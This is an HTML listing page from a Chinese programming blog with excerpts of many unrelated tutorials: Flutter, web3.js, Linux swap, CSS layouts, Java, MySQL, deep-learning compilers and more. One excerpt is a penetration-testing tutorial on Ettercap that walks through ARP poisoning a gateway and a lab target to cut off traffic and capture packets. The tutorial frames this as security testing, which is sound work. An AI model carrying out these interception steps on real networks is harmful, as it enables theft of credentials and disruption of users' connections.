<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="菜鸟程序员博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="菜鸟程序员博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b8a26006b64bfb2244c0e2c76218bcb0/" rel="bookmark">
			flutter自定义控件 - StatefulWidget中的State
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		对于一个StatefulWidget实例，其Widget可以有多个，但State只有一个。
问题背景 一个自定义StatefulWidget的具体实现通常由两部分组成：继承自StatefulWidget的Widget和继承自State&lt;T extends StatefulWidget&gt;的State.
当第一次构造StatefulWidget实例时（即使用Widget的构造函数构造实例），其主要构造过程如下（createState直接构造并返回State实例）：
[log] Widget: 构造函数 [log] Widget: createState [log] State: 构造函数 [log] State: initState [log] State: build 当其父控件因状态改变等原因再次构造该StatefulWidget实例时（即再次使用Widget的构造函数构造实例），其构造过程如下：
[log] Widget: 构造函数 [log] State: didUpdateWidget [log] State: build 可以看到，此时Widget中没有触发createState函数，即一个StatefulWidget实例的State只有一个。
因此当有StatefulWidget实现如下时：
class _Widget extends StatefulWidget { final _State _state; _Widget(double width, double height, {Key? key}) : _state = _State(width, height), super(key: key) { log('Widget: 构造函数 ${width}dp x ${height}dp'); } @override State&lt;StatefulWidget&gt; createState() { log('Widget: createState'); return _state; } } class _State extends State&lt;_Widget&gt; { final double _width; final double _height; _State(this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b8a26006b64bfb2244c0e2c76218bcb0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bbebe2d7dc04a1e7c8e9172f47ebc069/" rel="bookmark">
			web3.js socket心跳重连，WebsocketProvider
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如果您的团队在生产中使用Web3JS，那么您必须意识到Web3JS中没有内置的重新连接功能来处理区块链断开或重新启动。 因此，通常，当连接断开时，NodeJS服务也需要重新启动才能再次连接到区块链。
代码：
let hasProviderEnded = false , web3Instance, reconnectInterval = 10000 ; var lockReconnect = false; //避免重复连接 newBlockchainConnection(); function newBlockchainConnection(){ //设置地址 let _provider=new Web3.providers.WebsocketProvider(store.state.blockchain.blockChainAddr); hasProviderEnded = false ; _provider.on('connect',() =&gt;{ console.log( "区块链连接成功" ); }); _provider.on( 'error' , (err) =&gt;{ console.log("区块链异常错误：",err.message) }); _provider.on( 'end' , async (err) =&gt; { console.log( "区块链连接断开" ) //处理多个end的回调，不能重复处理，多次回调只处理一个。 if (hasProviderEnded) return ; hasProviderEnded = true ; //重置provider的socket实例，并移除相关监听 _provider.reset(); _provider.removeAllListeners( "connect" ); _provider.removeAllListeners( "error" ); _provider.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bbebe2d7dc04a1e7c8e9172f47ebc069/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9403c9cac1b3583c378a7e865b8e6e7f/" rel="bookmark">
			如何查看文件的md5值
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.首先在cmd窗口进入该文件的目录，使用。
cd 文件目录路径
2.查看md5值。
certutil -hashfile 123.jpg MD5
效果图：
3.文件的MD5是什么？
文件签名。
MD5在论坛上、软件发布时经常用，是为了保证文件的正确性，防止一些人盗用程序，加些木马或者篡改版权，设计的一套验证系统。每个文件都可以用MD5验证程序算出一个固定的MD5码来。软件作者往往会事先计算出他的程序的MD5码并帖在网上。因此，在网上看到某个程序下载旁注明了MD5码时，可以把它记下来，下载了这个程序后用MD5验证程序计算你所下载的文件的MD5码，和你之前记下MD5码比较，就知道你下的是不是原版了，如果两者相同，那么你所下载的是原版。如果计算出来的和网上注明的不匹配，那么你下载的这个文件不完整，或是被别人动过手脚。
相当于我们的身份证 独一无二的。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/be33403072378ef9fa503dee2e80bad8/" rel="bookmark">
			Centos7设置swap分区
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 Swap分区，即交换区，系统在物理内存（运行内存）不够时，与Swap进行交换。 其实，Swap的调整对Linux服务器，特别是Web服务器的性能至关重要。通过调整Swap，有时可以越过系统性能瓶颈，节省系统升级费用。
一、设置swap分区 1.检查是否存在swap分区 通过 free -h 命令 查看到swap分区大小为0，即没有设置过swap分区。
free -h 2.创建swap文件 一般来说swap分区大小为内存大小的两倍，首先在根目录创建一个名为swapfile的文件，可以用fallocate命令创建 ll -h 检查是否创建好，我的内存为4G，所以设置swap分区大小为8G。
fallocate -l 8G /swapfile ll -h /swapfile 3.启用swap分区 创建好swap文件需要启用，通过命令mkswap和swapon。
mkswap /swapfile swapon /swapfile 然后通过free查看是否设置好。
free -h 二、设置开机启动 设置开启启动，在 /etc/fstab 文件中加入如下行代码：
/swapfile swap swap defaults 0 0 以上就是swap分区的设置教程。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bc19611eeaac62fe79a8a099755e4894/" rel="bookmark">
			WPF 添加阴影效果
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 WPF最常见的一个阴影效果的类是DropShadowEffect,常用用的属性如下：
Color：设置颜色，默认为黑色
Direction：设置投影的方向(0-360)，为0时阴影在正右方，逆时针增加，默认为315(右下方)
ShadowDepth：设置投影距纹理的距离，为0时周围添加晕彩
Opacity：设置透明度,1为完全不透明，0为完全透明
BlurRadius：模糊阴影，默认为5
模糊效果的类BlurEffect，可以设置Radius模糊效果曲线的半径，KernelType计算模糊的曲线的值等等：
&lt;TextBlock Text="Hello world" Foreground="Green" HorizontalAlignment="Center" Margin="20" FontSize="36"&gt; &lt;TextBlock.Effect&gt; &lt;BlurEffect Radius="4" KernelType="Box" /&gt; &lt;/TextBlock.Effect&gt; &lt;/TextBlock&gt; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cc22a0aa8042ea97363cf13901efb71f/" rel="bookmark">
			Unity URP贴花系统的简单使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、unity版本：2021.2
二、创建URP项目
三、找到UniversalRenderer
四、创建GameObject添加贴花组件(URP Decal Projector)
五、创建材质球Material更改材质为Shader Graphs/Decal
六、添加Plane,把创建的材质球复制给URP Decal Projector组件
调整物体高度和角度就可以看到了
**
**
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/14f1fbc1359fe22f28c6bf641cb6deb7/" rel="bookmark">
			Auto-tunning调研（1）：TVM
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		引用的文献：
TVM: An Automated End-to-End Optimizing Compiler for Deep Learning
TVM: End-to-End Optimization Stack for Deep Learning
TVM是什么？ 深度学习需求非常火热，而已有的、处理深度学习作业的后端存在多样性。主流的深度学习框架将作业抽象成图的结构，来描述输入矩阵经过一系列算子（图节点）进行处理的workflow，这种基于计算图的方式给优化异构后端的优化带来了困难，针对新的算子优化也需要更多的人力。TVM所做的工作就是将顶层的机器学习业务逻辑跟底层的硬件优化相解耦。TVM立志于解决两个问题：1）现有的深度学习计算设备日新月异，包含很多新的、独家的特性，如果在编译器层面将这些特性利用起来。2）针对优化存在巨量的搜索空间，以CPU为例，循环展开、重排、平铺的组合就存在巨大的搜索空间。
TVM一共有两个层次的优化，一个是针对计算图结构的优化，一个是针对计算图中一个节点（算子）的自动优化。为了方便编程TVM提出了一种领域编程语言来定义一个算子的内容。从总体上来说，TVM本质是一个更接近编译器类型的工作，包含了：1）DSL代码编译；2）基于规则的优化，有计算图层面的，也有单个算子层面的；3）单个算子层面的自动调优；自动调优只占一部分。
概述 上图是TVM的架构，TVM立志于兼容已有主流的深度学习框架前端，通过获取深度学习程序的执行图，并重写执行图结构来生成经过优化的执行图。对于执行图的重写是第一个工作。针对单个算子，TVM提出做了3点工作：1）一个是算子的定义原语，包含了矩阵的计算逻辑；2）一个和硬件特点紧耦合的优化原语，用户可以定义优化手段；3）自动调优。
Graph-level的优化 如上图，用计算图（节点为算子，边为数据）作为一种手段描述执行逻辑是很常见的一种方式，无论从早期的LLVM和当今的人工智能框架。TVM可以通过修改图的结构，获得四种优化手段：1）节点（算子）融合，将多个小算子融合为一个大算子，2）常量折叠，将图中可以在运行前计算出的部分提前算出来，在运行时作为静态变量；3）静态内存分配，在计算之前为图执行产生的中间临时数据申请内存；4）数据布局转换，在数据格式转化为适合某个硬件后端的版本。
算子融合需要对算子的类型提前进行标注，要融合的两个算子需要符合特定类型才能融合。
数据布局转换主要根据硬件的特点（存储层次等）选择最合适的内部数据布局。
生成一个算子 TVM在单个算子层面的设计继承了Halide的思路，将业务的描述和优化调度解耦。
上图顶部是Tensor计算的DSL，表达了矩阵乘法的操作。这段代码的首要特点就是所有矩阵的长和宽都需要显式声明出来。在用户声明出业务逻辑之后，TVM会用户**事先声明的优化策略（schedule primitives）**来执行增量的代码转换，在将代码转化为后端具体硬件的代码的同时进行优化。上图剩下的部分展现的是典型的代码转化过程，纵向的箭头代表代码转换和优化手段的叠加，横向的过程代表了将当前经过优化的代码转换到特定硬件上。这里的优化手段是循环平铺，实际上还能有利用多层次缓存等优化手段。在工程上，继承了Halid。
TVM在单个算子层面实现了有合作的嵌套并行。主要用于数据并行的任务分配，在以往fork-join模式的并行中，fork阶段会有一个主线程准备好所有数据分配，然后子线程利用已有的数据分配来执行任务，在执行的过程中，线程之间没有交流。为了适应GPU等设备的运行模式，TVM会让不同线程合作执行数据的加载，如下图所示，这里所有线程将数据合作加载到共享内存中，按照一定步长，每个线程负责一部分：
此外，这里还引入了缓存标记来表示不同的内存层次（AS、BS表示shared memory）。此外，要计算依赖，并且给出适当的同步来保证一致性。
单个算子层面的优化还包含张量化，即可以直接在顶层DSL中直接加入硬件原语来支持硬件SIMD。下面的例子是在CPU中直接支持硬件级8*8张量计算：
TVM还为调度能力差的硬件加速器提供了显式内存延迟隐藏，也就是将计算和访存overlap起来（访问和计算的指令集并行），这在CPU这类的计算设备中很常见，主要通过硬件级调度实现。但是一些加速器比如TPU没有这样的功能，甚至TPU连线程这样的视图都没有。所以TVM需要在软件层面做好指令的调度，支持“虚拟线程”和“双流水线”。
“虚拟内存”的实现主要通过将两个指令流在加入低级别同步之后合并为一条指令流，合并之后这个问题就收敛为单个指令流的调度问题，如下图所示：
为了解决单个指令流的调度问题，引入两个流水线：访存指令流水线和计算指令流水线。通过两种指令的输入输出，可以得到两个流水线之间的指令依赖关系。然后在考虑这些依赖关系的基础上将两个流水线之间的内容穿插起来：
从上图可以看出调度的效果是显而易见的，从右边ld指令和ex指令扎堆放置的指令流变成了，左上ld和ex穿插起来的指令流。
自动调优 用户提前定义的优化规则特别多，那么什么样的优化手段以及优化中的参数组合是最优，这需要自动找出。TVM提供了两个组件解决这个问题：1）一个调度探索器用来不断产生新的优化配置，2）一个基于机器学习的代价模型来预测优化的效果。
自动优化的搜索空间是巨大的。用户对于优化手段的预定义并不是完整的，会留有很多的参数（循环展开次数，循环平铺结构）。这些参数的数量是无限的，即便执行网格化的参数搜索也有数亿大小的空间。为了降低训练的开销，TVM并不会去真正预测不同优化手段的执行时间，而是不同优化手段的优化效果的排名。使用的模型是梯度树提升模型（gradient tree boosting model）。这个模型不是神经网络的路数，需要对每一层循环进行特征提取：针对各级内存的访问量，以及针对循环的指令方法类型（向量化，并行，循环展开）。因为搜索空间非常巨大，所以不会用代价模型一个个去把所有的优化配置的最终性能预测出来，而是采用并行退火算法，从多个随机的位置开始尝试，然后从随机位置附近一步一步向优化效果好的方向寻找。
测试 TVM在GPU，嵌入式CPU和FPGA上进行了测试，获得了比一些现成的机器学习库更好数倍的性能。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a6e64c603b223ff292a223f88a1384cc/" rel="bookmark">
			Auto-tunning调研（2）：TASO
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
TASO是什么？
图替换策略的自动生成
验证自动生成的图替换策略的正确性
引用的文献：
TASO: Optimizing Deep Learning Computation with Automatic Generation of Graph Substitutions
TASO是什么？ TASO主要是针对计算图结构的优化。并且这个结构的优化不是基于规则，而是让机器自动化找出所有可能的图替换策略。在最优执行图结构的搜索中，采用基于代价估计（cost-based）的方式。
DNN通常被表示为计算图。为了提升计算图的性能，大多数优化手段都是通过匹配已有计算图中的特定模式，并且替换特定的子图来达成。已有的图替换主要是纯手动或者半自动的方式执行。TASO的动机来源于三个方面：1）手动图替换的优化方式需要应对不断产生的新算子，这些新算子和已有的算子组合产生的子图模式是以几何倍次增长的，可维护性差；2）已有的工作不考虑将子图优化（图结构变换）和数据布局优化（数据在不同层次内存的放置）分开考虑，但是优势最优的数据布局和子图的结构本身是有关系的，所以应该将二者合起来考虑；3）在已有的DNN框架中还未引入形式化验证手段来保证转化前和转化后的计算图的语义是相同的（在传统编译器中，这个方面已经做得很成熟）。
为了解决以上问题，TASO做了三件事情：1）自动产生图替换策略，用户只需要定义算子（图节点）；2）用形式化验证的手段来图替换的正确性；3）将数据布局和图替换合起来考虑，进一步挖掘性能潜力。
图替换策略的自动生成 根据已有算子组合出（一定大小范围内）的各种子图的可能，并且找出潜在的等价的子图。等价子图的寻找方法主要是通过特定数据集的单元测试，TASO将单元测试结果的哈希值相同的子图作为潜在的“等价子图”。比如说下图，根据输出X的哈希值，可以判断出两个子图是潜在等价的：
​
​
​​
为了增加优化的可能，TASO引入了两个算子：split，用来将一个矩阵切成两个矩阵；concat，用来将两个矩阵合并为一个矩阵。这样子以利于进行类似于算子合并这样的优化，比如下面的例子合并了两个矩阵乘法操作：
​
​
这种子图之间的等效是无视输入矩阵的形状（子图的等价代表子图在任何形状的输入矩阵的前提下，输出都是相同），但是一般会把算子的参数纳入考虑（比如split的切分点和concat的连接点，在特定的算子参数下子图才能等价）。但是如果将输出点和连接点的所有可能都纳入考虑，搜索空间也太大了。一般来讲一个切分往往对应着一个连接，反之亦然，并且切分和连接的位置往往对应。所以引入“切分树”来记录之前是怎么切分的，这样在之后只有可能在一个对应位置连接才能保证语义的等价性，反之亦然。下图反应了如何通过合并输入数据来合并矩阵乘法、记录合并点、并且最后在对应位置拆分三个过程（灰框中是连接点）：
​
​
整个的搜索过程采用类似深度优先搜索的方式，从一个节点（算子）的输出开始，在限定的节点数量的范围内，不断地在已有图的不同输出位置上长出新的节点（算子），总而产生新的子图结构。然后单元测试、记录输出的哈希、比对不同子图哈希值。值得注意的卷积的padding和relu都会在输出中引入大量的0，从而造成输出相同、语义相同的误判（只是单纯喜欢产生0而已），需要特别处理。
TASO只使用了一个测试用例来进行单元测试，因为DNN类型的应用都是计算密集并且没有分支的特点，所以即便只用一个测试用例，也完全没有误判。
验证自动生成的图替换策略的正确性 （未完待续）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b9a4588a8b32cb5af3876264fa3b67b5/" rel="bookmark">
			圣杯布局和双飞翼布局
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		双飞翼布局与圣杯布局 圣杯布局和双飞翼布局是前端工程师需要日常掌握的重要布局方式。两者的功能相同，都是为了实现一个两侧宽度固定，中间宽度自适应的三栏布局。
特点：
两侧宽度固定，中间宽度自适应（三栏布局）中间部分在DOM结构上有限，以便先行渲染允许三列中的任意一列成为最高列只需要使用一个额外的div标签 圣杯布局：
DOM结构：
&lt;div class="header"&gt;&lt;/div&gt; &lt;div class="container"&gt; &lt;div class="center"&gt;&lt;/div&gt; &lt;div class="left"&gt;&lt;/div&gt; &lt;div class="right"&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class="footer"&gt;&lt;/div&gt; 首先定义出整个布局的DOM结构，主体部分是由container包裹的center,left,right三列，其中center定义在最前面。
CSS代码：
假设左侧的固定宽度为200px，右侧的固定宽度为150px，则首先在container上设置：
#container { padding-left: 200px; padding-right: 200px; } 为左右两列预留出相应的空间，得到如下示意图：
随后分别为三列设置宽度与浮动，同时对footer设置清除浮动：
#container .column { float: left; } #center { width: 100%; } #left { width: 200px; } #right { width: 150px; } #footer { clear: both; } 得到如下效果：
根据浮动的特性，由于center的宽度为100%，即占据了第一行的所有空间，所以left和right被“挤”到了第二行。
接下来的工作是将left放置到之前预留出的位置上，这里使用负外边距（nagetive margin）：
#left { width: 200px; margin-left: -100%; } 得到：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b9a4588a8b32cb5af3876264fa3b67b5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/60f2381da3cae7f3000dff93d4e2c17c/" rel="bookmark">
			深入解析 synchronized 关键字
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1、synchronized 的作用2、synchronized 的用法3、synchronized 的底层实现原理3.1、synchronized 修饰方法的底层实现原理3.2、synchronized 修饰代码块的底层实现原理 4、synchronized 锁相关概念及优化原因4.1、为什么优化 synchronized ？4.2、Java 对象头 5、synchronized 的锁升级过程5.1、偏向锁5.2、轻量级锁（自旋锁）5.3、重量级锁5.4、小结 6、synchronized 可重入锁7、synchronized 为什么是非公平锁？非公平体现在哪些地方？ 最近看了几篇 synchronized 关键字的相关文章，收获很大，想着总结一下该关键字的相关内容。
1、synchronized 的作用 原子性：所谓原子性就是指一个操作或者多个操作，要么全部执行并且执行的过程不会被任何因素打断，要么就都不执行。 被 synchronized 修饰的类或对象的所有操作都是原子的，因为在执行操作之前必须先获得类或对象的锁，直到执行完才能释放。
可见性：可见性是指当多个线程访问同一个变量时，一个线程修改了这个变量的值，其他线程能够立即看得到修改的值。 通过 synchronized 和 Lock 也能够保证可见性，synchronized 和 Lock 能保证同一时刻只有一个线程获取锁然后执行同步代码，并且在释放锁之前会将对变量的修改刷新到主存当中。因此可以保证可见性。
有序性：即程序执行的顺序按照代码的先后顺序执行。 可以通过 synchronized 和 Lock 来保证有序性，很显然，synchronized 和 Lock 保证每个时刻是有一个线程执行同步代码，相当于是让线程顺序执行同步代码，自然就保证了有序性。
2、synchronized 的用法 修饰普通方法:作用于当前对象实例，进入同步代码前要获得当前对象实例的锁。 synchronized void f() { //业务逻辑 } 修饰静态方法:作用于当前类，进入同步代码前要获得当前类对象的锁,synchronized 关键字加到 static 静态方法和 synchronized(class) 代码块上都是是给 Class 类上锁。 synchronized void staic f() { //业务逻辑 } 修饰代码块:指定加锁对象，对给定对象加锁，进入同步代码块前要获得给定对象的锁。 synchronized(this) { //业务逻辑 } 3、synchronized 的底层实现原理 当为重量锁的时候，对象头中会存在一个监视器对象，也就是 Monitor 对象。这个 Monitor 对象就是实现 synchronized 的一个关键。线程如果想要进入 synchronized 修饰的语句块的话，线程需要获得对应的 Monitor 对象。如果要退出的话，其实就是对 Monitor 对象的持有权的释放。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/60f2381da3cae7f3000dff93d4e2c17c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9edb3c572b56b91542af659480518681/" rel="bookmark">
			Mysql
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.什么是mysql
mysql其实是关系型数据库管理系统RDBMS，但人们习惯称他为数据库。
2. SQL的分类
DDL数据库定义语言Data Definition Language
例如create drop alter
DQL数据库查询语言Data Query Language
例如select
DML数据库操作语言Data Manipulation Language
例如insert delete update
TCL事务操作语言Transactional Control Language
DCL数据控制语言Data Control Language
3.mysql常用命令
创建数据库：
create datebase 数据库名;
查询当前所用数据库：
select database();
查看现有的数据库：
show databases;
使用数据库:
use 数据库名;
查看当前数据库的表：
show tables;
查看表结构：
decs 表名;
查看建表语句：
show create table 表名;
4.select语句中可以进行算术运算
如select empno, ename, sal*12 from emp;
5.给字段起别名：
格式：字段名 as 'xxx'
as可以省略 6.运算符
运算符
说明
=
等于
&lt;&gt;或!=
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9edb3c572b56b91542af659480518681/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/93848e807be2942187dec1e57e8064f2/" rel="bookmark">
			Python: 去掉字符串开头、结尾或者中间不想要的字符
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		参考 字符串处理 - 云+社区 - 腾讯云
①Strip()方法用于删除开始或结尾的字符。lstrip()|rstirp()分别从左右执行删除操作。默认情况下会删除空白或者换行符，也可以指定其他字符。
②如果想处理中间的空格，需要求助其他技术 ，比如replace(),或者正则表达式
③strip()和其他迭代结合，从文件中读取多行数据，使用生成器表达式
④更高阶的strip 可能需要使用translate()方法。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/efd5e254f2120e95ae8975da267d4518/" rel="bookmark">
			Ettercap的基本使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.Ettercap工具介绍 Ettercap是基于ARP地址欺骗方式的网络嗅探工具，主要适用于交换的局域网络
借助Ettercap嗅探软件，渗透测试人员可以检测网络内明文数据通讯的安全性，及时采取措施，避免敏感的用户名/密码等数据以明文的方式进行传输
2.Ettercap劫持用户信息攻击步骤 2.1.启动Ettercap
在kali的终端中输入
ettercap -G
点击右上角的勾号
2.2.扫描局域网内存活的主机 点击左上角的列表，host list
如图
192.168.241.2 就是网关的ip
192.168.241.129 就是靶机的ip
2.3.添加目标 选中网关点击 Add to Target1
选中靶机点击 Add to Target2
2.4.发起攻击 2.4.1.断网攻击
停止扫描+ARP poisoning
2.4.2.窃取数据包
打开扫描 + ARP poisoning
3.Ettercap软件功能介绍 3.1启动界面 开启嗅探Sniffing at startup选择网卡Primary interface是否开启桥接模式Bridged sniffing桥接模式下的网卡Bridged interface 3.2中间人攻击菜单 ARP poisoningARP攻击DNP poisoningDNP攻击ICMP redirectICMP重定向攻击Port stealing端口欺骗DHCP spoofingDHCP欺骗stop MITM attack(s)停止攻击SSL interceptSSL嗅探 3.3更多选项 Target ： 攻击列表
Current targets正在攻击的列表Select targets选择攻击列表Protocol攻击协议Reverse matching匹配规则Wipe targets擦除攻击 Hosts：显示主机
Hosts list扫描到的主机列表Enable ipv6 scan扫描ipv6地址Scan for hosts扫描主机列表load hosts from file从外部文件载入主机列表Save hosts to file保存主机列表到文件 view：视图
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/efd5e254f2120e95ae8975da267d4518/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0dceb8731364a7ff8ab312d34d8bb239/" rel="bookmark">
			Error: cannot allocate vector of size XX Gb
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Error: cannot allocate vector of size XX Gb 目录
Error: cannot allocate vector of size XX Gb
#问题
#解决
#增大内存
#问题 x &lt;- rnorm(4000000000) # Trying to run rnorm function # Error: cannot allocate vector of size 29.8 Gb #解决 #垃圾回收； gc() #空间依旧不够 x &lt;- rnorm(4000000000) # Trying to run rnorm function # Error: cannot allocate vector of size 29.8 Gb #增大内存 #查看分配的内存大小 memory.limit() # Check currently set limit # [1] 16267 #增大分配的内存 memory.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0dceb8731364a7ff8ab312d34d8bb239/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/448beaab15ef176fdb7152f5fb66e003/" rel="bookmark">
			C#编程时，WinForm中PictureBox.Image加载大尺寸图片，显示实时照片会造成内存溢出，解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		pictureBox1.Image = (Bitmap)pictureBox1.Clone();
GC.Collect();
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5bd3074e76254bbdc61e9da567bf5040/" rel="bookmark">
			动手学深度学习-线性回归的简单实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		动手学深度学习-线性回归的简单实现 一、生成数据集二、读取数据集三、定义模型四、初始化模型参数五、定义损失函数六、定义优化算法七、训练 本节介绍如何使用深度学习框架实现线性回归模型。
一、生成数据集 import numpy as np import torch from torch.utils import data from d2l import torch as d2l true_w = torch.tensor([2,-3.4]) true_b = 4.2 # 调用d2l包中生成数据函数，features是X，一个1000行2列的张量 # labels是一个1000行一列的张量 也就是y features,labels = d2l.synthetic_data(true_w,true_b,1000) 二、读取数据集 调用框架中现有的API来读取数据。我们每次只选取部分数据集进行训练。将上面的features和labels作为API的参数进行传递，并通过数据迭代器指定batch_size。此外布尔值is_train表示是否希望数据迭代器对象在每个迭代周期内打乱数据。
def load_array(data_arrays,batch_size,is_train=True): """构造一个pytorch数据迭代器""" dataset = data.TensorDataset(*data_arrays) # TensorDataset对张量进行打包 # dataloader进行数据封装 return data.DataLoader(dataset,batch_size,shuffle=is_train) batch_size = 10 # 返回的是一个迭代器 每次加载batch_size批量的数据 data_iter = load_array((features,labels),batch_size) next(iter(data_iter)) [tensor([[ 0.4959, 0.8714], [ 0.7823, -1.7682], [-0.1917, 0.1726], [-2.0061, -1.2517], [-0.2063, -0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5bd3074e76254bbdc61e9da567bf5040/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bb2f6da072af6476f9d2d25013615685/" rel="bookmark">
			接入alipay-sdk
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		沙箱环境申请地址：https://open.alipay.com/platform/appDaily.htm?tab=info
所需参数：
//支付宝网关地址:https://openapi.alipay.com/gateway.do //支付宝申请的APPID //商户应用私钥(与支付宝数据交互时,保证数据安全，防止数据被篡改) //支付宝公钥(与支付宝数据交互时，保证数据安全,防止数据被篡改) //签名算法类型(RSA2或者RSA,支付宝推荐使用RSA2) //编码格式(utf-8,gb2312,gbk) 各接口详细参数地址：https://opendocs.alipay.com/apis
沙箱app下载地址（注意沙箱APP只有安卓版本的）：https://open.alipay.com/platform/appDaily.htm?tab=tool
maven包地址：
&lt;dependency&gt; &lt;groupId&gt;com.alipay.sdk&lt;/groupId&gt; &lt;artifactId&gt;alipay-sdk-java&lt;/artifactId&gt; &lt;version&gt;4.22.57.ALL&lt;/version&gt; &lt;/dependency&gt; SDK所需初始化参数类：
app: pay: ali: app_id: 你的appId mch_id: 你的沙箱商户id server_url: https://openapi.alipaydev.com/gateway.do #这里是沙箱版本的地址 alipay_private_key: 你的应用私钥 alipay_public_key: 你的支付宝公钥 charset: UTF-8 sign_type: RSA2 format: json notify_url: http://localhost:8080/api/pay/ali/notify return_url: http://localhost:8080/api refund_url: http://localhost:8080/api /** * @author zhangyujie * @since 2022-04-05 **/ @Data public class AliProperties { /** * 应用id */ public String appId; /** * 应用私钥 */ public String alipayPrivateKey; /** * 支付宝公钥 */ public String alipayPublicKey; /** * 字符编码 */ public String charset; /** * 签名方式 */ public String signType; /** * 数据格式 */ public String format; /** * 商家id */ private String mchId; /** * 调用接口的url */ private String serverUrl; /** * 支付回调url */ private String notifyUrl; /** * pc支付前台通知 */ private String returnUrl; /** * 退款url */ private String refundUrl; } /** * @author zhangyujie * @since 2022-04-05 **/ @Configuration @ConfigurationProperties(prefix = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bb2f6da072af6476f9d2d25013615685/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/26afbea4569d17579173b935d1e4eb30/" rel="bookmark">
			轻量化神经网络整理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
